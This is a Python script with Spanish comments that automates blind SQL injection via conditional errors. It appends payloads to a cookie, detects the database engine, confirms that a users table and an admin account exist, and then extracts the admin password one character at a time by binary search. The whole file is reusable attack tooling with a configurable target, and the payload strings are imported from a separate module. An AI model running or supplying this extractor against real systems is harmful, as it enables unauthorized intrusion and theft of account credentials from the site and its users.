import sys
import time
import requests
import urllib3

from dbms_profiles import DB_PROFILES

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# ----------------CONFIGURACIÓN GENERAL----------------             
# Cambiar SOLO esta sección para reutilizar el script.           


# ── URL objetivo ──────────────────────────────────────────────────
TARGET_URL = "https://............................"

# ── Cookies ───────────────────────────────────────────────────────
# Cookie donde se inyecta el payload (se concatena al final del valor)
VULNERABLE_COOKIE_NAME = "cookie-name"
VULNERABLE_COOKIE_VALUE = "cookie-value"

# Cookies adicionales que necesita la petición (sesión, etc.)
EXTRA_COOKIES = {
    "session": "value",
}

# ── Objetivo de extracción ────────────────────────────────────────
TABLE_NAME = "users"                # Tabla donde está el dato
USERNAME_COLUMN = "username"        # Columna del nombre de usuario
PASSWORD_COLUMN = "password"        # Columna de la contraseña
TARGET_USERNAME = "admin"   # Usuario cuya contraseña queremos

# ── Parámetros de fuerza bruta ────────────────────────────────────
MAX_PASSWORD_LENGTH = 50    # Longitud máxima a probar al buscar el largo
ASCII_LOW = 32              # Rango ASCII inferior (espacio)
ASCII_HIGH = 126            # Rango ASCII superior (~)

# ── DBMS ──────────────────────────────────────────────────────────
# "auto" = detección automática.  Valores manuales: oracle, postgresql, mysql, mssql, sqlite
DBMS = "auto"

# ── Detección de error ────────────────────────────────────────────
# Código HTTP que la aplicación devuelve cuando la consulta SQL produce un error.
ERROR_STATUS_CODE = 500

# ── Red / Rendimiento ────────────────────────────────────────────
REQUEST_TIMEOUT = 15
THREADS = 1                 # Futuro: threading (por ahora secuencial)
VERIFY_SSL = False
VERBOSE = True              # Mostrar cada petición de debug

# ── Headers HTTP ──────────────────────────────────────────────────
HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/131.0.0.0 Safari/537.36"
    ),
    "Accept": (
        "text/html,application/xhtml+xml,application/xml;"
        "q=0.9,image/avif,image/webp,*/*;q=0.8"
    ),
    "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
}



# --------------FUNCIONES DE ATAQUE Y EXTRACCIÓN----------------

class BlindSQLiExtractor:
    """Motor de extracción por Blind SQLi con errores condicionales."""

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.session.verify = VERIFY_SSL
        self.dbms = None
        self.profile = None
        self.request_count = 0

    # ── Envío de payload ──────────────────────────────────────────
    def send(self, injection: str, label: str = "") -> bool:
        """Envía la inyección como parte de la cookie y devuelve True si hay error (500)."""
        cookies = {
            VULNERABLE_COOKIE_NAME: VULNERABLE_COOKIE_VALUE + injection,
            **EXTRA_COOKIES,
        }
        try:
            r = self.session.get(
                TARGET_URL, cookies=cookies, timeout=REQUEST_TIMEOUT
            )
            self.request_count += 1
            is_error = r.status_code == ERROR_STATUS_CODE
            if VERBOSE and label:
                status_icon = "X" if is_error else "OK"
                print(f"    [{status_icon}] {label} → HTTP {r.status_code}")
            return is_error
        except requests.RequestException as e:
            print(f"    [!] Error de red: {e}")
            return False

    # ── Detección de DBMS ─────────────────────────────────────────
    def detect_dbms(self) -> str | None:
        """
        Intenta detectar el DBMS probando el payload condicional TRUE/FALSE
        de cada motor. Si TRUE da error y FALSE no, es ese DBMS.
        """
        print("\n" + "=" * 60)
        print("  FASE 0 · Detección del DBMS")
        print("=" * 60)

        # Primero: verificación básica de que la inyección funciona
        print("\n[*] Baseline — sin inyección:")
        baseline_error = self.send("", "sin inyección")

        print("[*] Comilla simple (debería romper la consulta):")
        single_quote = self.send("'", "solo comilla")

        print("[*] Comilla cerrada (debería ser válido):")
        closed_quote = self.send("''", "comilla cerrada")

        if baseline_error:
            print("\n[!] ATENCIÓN: La petición base ya devuelve error.")
            print("    Verifica la URL y las cookies.")

        # Orden de detección: Oracle → PostgreSQL → MySQL → MSSQL → SQLite
        detection_order = ["oracle", "postgresql", "mysql", "mssql"]

        for db_key in detection_order:
            profile = DB_PROFILES[db_key]
            print(f"\n[*] Probando {profile['name']}...")

            true_result = self.send(
                profile["fingerprint_true"],
                f"{profile['name']} CASE TRUE → ¿error?"
            )
            false_result = self.send(
                profile["fingerprint_false"],
                f"{profile['name']} CASE FALSE → ¿OK?"
            )

            if true_result and not false_result:
                print(f"\n[OK] DBMS detectado: {profile['name']}")
                return db_key

        print("\n[X] No se pudo detectar el DBMS automáticamente.")
        print("    Prueba seleccionándolo manualmente con DBMS = 'oracle' etc.")
        return None

    # ── Verificar existencia de tabla ─────────────────────────────
    def check_table(self) -> bool:
        """Verifica que la tabla objetivo existe."""
        print(f"\n[*] ¿Existe la tabla '{TABLE_NAME}'?")
        payload = self.profile["table_exists"].format(table=TABLE_NAME)
        result = self.send(payload, f"tabla '{TABLE_NAME}'")
        # Para Oracle/PostgreSQL: si NO da error, la tabla existe.
        # Para MySQL/MSSQL/SQLite: si DA error, la condición (count>0) es TRUE → tabla existe.
        if self.dbms in ("oracle", "postgresql"):
            exists = not result
        else:
            exists = result
        if exists:
            print(f"    [OK] Tabla '{TABLE_NAME}' existe")
        else:
            print(f"    [X] Tabla '{TABLE_NAME}' NO encontrada")
        return exists

    # ── Verificar existencia de columna ───────────────────────────
    def check_column(self, column_name: str) -> bool:
        """Verifica que una columna existe en la tabla."""
        print(f"[*] ¿Existe columna '{column_name}' en '{TABLE_NAME}'?")
        payload = self.profile["column_exists"].format(
            table=TABLE_NAME, column=column_name
        )
        result = self.send(payload, f"columna '{column_name}'")
        if self.dbms in ("oracle", "postgresql", "sqlite"):
            exists = not result
        else:
            exists = result
        if exists:
            print(f"    [OK] Columna '{column_name}' existe")
        else:
            print(f"    [X] Columna '{column_name}' NO encontrada")
        return exists

    # ── Verificar existencia de usuario ───────────────────────────
    def check_user(self) -> bool:
        """Verifica que el usuario objetivo existe en la tabla."""
        print(f"\n[*] ¿Existe el usuario '{TARGET_USERNAME}'?")
        payload = self.profile["user_exists"].format(
            table=TABLE_NAME,
            col_user=USERNAME_COLUMN,
            user=TARGET_USERNAME,
        )
        result = self.send(payload, f"usuario '{TARGET_USERNAME}'")
        # Error = condición TRUE = usuario existe
        if result:
            print(f"    [OK] Usuario '{TARGET_USERNAME}' existe")
        else:
            print(f"    [X] Usuario '{TARGET_USERNAME}' NO encontrado")
        return result

    # ── Obtener longitud del password ─────────────────────────────
    def get_password_length(self) -> int:
        """Determina la longitud del password por búsqueda binaria."""
        print(f"\n[*] Determinando longitud del password...")
        low = 0
        high = MAX_PASSWORD_LENGTH

        while low < high:
            mid = (low + high) // 2
            payload = self.profile["password_length"].format(
                table=TABLE_NAME,
                col_user=USERNAME_COLUMN,
                col_pass=PASSWORD_COLUMN,
                user=TARGET_USERNAME,
                length=mid,
            )
            if self.send(payload, f"LENGTH > {mid}"):
                low = mid + 1
            else:
                high = mid

        print(f"    [OK] Longitud del password: {low}")
        return low

    # ── Extraer un carácter ───────────────────────────────────────
    def extract_char(self, position: int) -> str:
        """Extrae un carácter del password usando búsqueda binaria sobre ASCII."""
        low = ASCII_LOW
        high = ASCII_HIGH

        while low < high:
            mid = (low + high) // 2
            payload = self.profile["extract_char"].format(
                table=TABLE_NAME,
                col_user=USERNAME_COLUMN,
                col_pass=PASSWORD_COLUMN,
                user=TARGET_USERNAME,
                pos=position,
                mid=mid,
            )
            if self.send(payload, f"pos={position} ASCII>{mid}"):
                low = mid + 1
            else:
                high = mid

        return chr(low)

    # ── Flujo principal ───────────────────────────────────────────
    def run(self):
        """Ejecuta todo el flujo de ataque."""
        banner = r"""
  ╔══════════════════════════════════════════════════════════╗
  ║  Blind SQLi · Conditional Errors · Automated Extractor  ║
  ╚══════════════════════════════════════════════════════════╝
        """
        print(banner)
        print(f"  Target : {TARGET_URL}")
        print(f"  Tabla  : {TABLE_NAME}")
        print(f"  Usuario: {TARGET_USERNAME}")
        print(f"  DBMS   : {DBMS}")

        # ── FASE 0: Detectar o seleccionar DBMS ──
        if DBMS == "auto":
            detected = self.detect_dbms()
            if detected is None:
                print("\n[!] Abortando. No se detectó el DBMS.")
                sys.exit(1)
            self.dbms = detected
        else:
            if DBMS not in DB_PROFILES:
                print(f"\n[!] DBMS '{DBMS}' no soportado.")
                print(f"    Opciones: {', '.join(DB_PROFILES.keys())}")
                sys.exit(1)
            self.dbms = DBMS
            print(f"\n[*] DBMS seleccionado manualmente: {DB_PROFILES[DBMS]['name']}")

            # Verificar que funciona el condicional
            print("\n[*] Verificando inyección condicional...")
            p = DB_PROFILES[self.dbms]
            t1 = self.send(p["fingerprint_true"], "CASE TRUE → ¿error?")
            t2 = self.send(p["fingerprint_false"], "CASE FALSE → ¿OK?")
            if t1 and not t2:
                print("    [OK] Inyección condicional funciona correctamente")
            else:
                print(f"    [X] Fallo: TRUE→{t1}, FALSE→{t2}")
                print("    [!] Verifica cookies, URL y tipo de DBMS.")
                sys.exit(1)

        self.profile = DB_PROFILES[self.dbms]

        # ── FASE 1: Verificar tabla ──
        print("\n" + "=" * 60)
        print("  FASE 1 · Verificación de estructura")
        print("=" * 60)

        if not self.check_table():
            print("[!] Abortando: la tabla no existe.")
            sys.exit(1)

        # ── FASE 2: Verificar columnas ──
        self.check_column(USERNAME_COLUMN)
        self.check_column(PASSWORD_COLUMN)

        # ── FASE 3: Verificar usuario ──
        if not self.check_user():
            print("[!] Abortando: el usuario no existe en la tabla.")
            sys.exit(1)

        # ── FASE 4: Longitud del password ──
        print("\n" + "=" * 60)
        print("  FASE 2 · Longitud del password")
        print("=" * 60)

        pwd_length = self.get_password_length()
        if pwd_length == 0:
            print("[!] No se pudo determinar la longitud. ¿Password vacío?")
            sys.exit(1)

        # ── FASE 5: Extracción carácter a carácter ──
        print("\n" + "=" * 60)
        print(f"  FASE 3 · Extrayendo password ({pwd_length} caracteres)")
        print("=" * 60 + "\n")

        start_time = time.time()
        password = ""

        for pos in range(1, pwd_length + 1):
            char = self.extract_char(pos)
            password += char
            elapsed = time.time() - start_time
            print(
                f"  [{pos:2d}/{pwd_length}]  '{char}'  "
                f"(ASCII {ord(char):3d})  →  {password}  "
                f"[{elapsed:.1f}s | {self.request_count} reqs]"
            )

        # ── Resultado final ──
        print("\n" + "═" * 60)
        print(f"  OK PASSWORD EXTRAÍDO: {password}")
        print(f"  OK Usuario: {TARGET_USERNAME}")
        print(f"  OK DBMS: {self.profile['name']}")
        print(f"  OK Peticiones totales: {self.request_count}")
        print(f"  OK Tiempo total: {time.time() - start_time:.1f}s")
        print("═" * 60 + "\n")

        return password